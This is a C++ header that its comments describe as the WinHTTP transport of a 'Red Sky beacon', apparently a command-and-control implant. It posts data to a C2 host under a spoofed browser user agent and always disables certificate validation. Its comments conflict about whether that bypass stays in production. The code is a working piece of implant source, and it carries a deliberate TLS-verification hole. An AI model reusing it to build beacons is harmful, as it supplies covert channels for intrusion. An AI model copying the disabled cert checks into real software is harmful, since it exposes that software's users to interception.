// language: C++, file: http.hpp, target: Red Sky beacon — WinHTTP wrapper
// Single function to POST a body and read the response. TLS by default,
// self-signed accepted when TLS is enabled (beacon opts out of cert verify
// for local/self-signed C2 — production C2 uses a real cert and this is fine).

#pragma once
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>

#pragma comment(lib, "winhttp.lib")

namespace rs { namespace http {

inline std::string wide_to_utf8(const std::wstring& w) {
    if (w.empty()) return "";
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string out(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &out[0], n, nullptr, nullptr);
    return out;
}

inline std::wstring utf8_to_wide(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    std::wstring out(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &out[0], n);
    return out;
}

// POST body to https://host:port/path. Returns response body, or empty on failure.
inline std::string post(const std::string& host, int port, const std::string& path,
                        bool tls, const std::string& body) {
    std::string resp;
    std::wstring whost = utf8_to_wide(host);
    std::wstring wpath = utf8_to_wide(path);

    HINTERNET session = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                    WINHTTP_ACCESS_TYPE_NO_PROXY,
                                    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return resp;

    HINTERNET conn = WinHttpConnect(session, whost.c_str(), (INTERNET_PORT)port, 0);
    if (!conn) { WinHttpCloseHandle(session); return resp; }

    DWORD flags = tls ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET req = WinHttpOpenRequest(conn, L"POST", wpath.c_str(), nullptr,
                                       WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!req) { WinHttpCloseHandle(conn); WinHttpCloseHandle(session); return resp; }

    // accept self-signed certs (production replaces this with cert pinning)
    DWORD sec = SECURITY_FLAG_IGNORE_UNKNOWN_CA
              | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
              | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));

    WinHttpAddRequestHeaders(req, L"Content-Type: text/plain\r\n", -1, WINHTTP_ADDREQ_FLAG_ADD);

    WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                       (LPVOID)body.data(), (DWORD)body.size(),
                       (DWORD)body.size(), 0);

    if (!WinHttpReceiveResponse(req, nullptr)) {
        WinHttpCloseHandle(req);
        WinHttpCloseHandle(conn);
        WinHttpCloseHandle(session);
        return resp;
    }

    DWORD avail = 0;
    do {
        if (!WinHttpQueryDataAvailable(req, &avail)) break;
        if (!avail) break;
        std::vector<char> buf(avail);
        DWORD got = 0;
        if (!WinHttpReadData(req, buf.data(), avail, &got)) break;
        resp.append(buf.data(), got);
    } while (avail > 0);

    WinHttpCloseHandle(req);
    WinHttpCloseHandle(conn);
    WinHttpCloseHandle(session);
    return resp;
}

}} // namespace rs::http
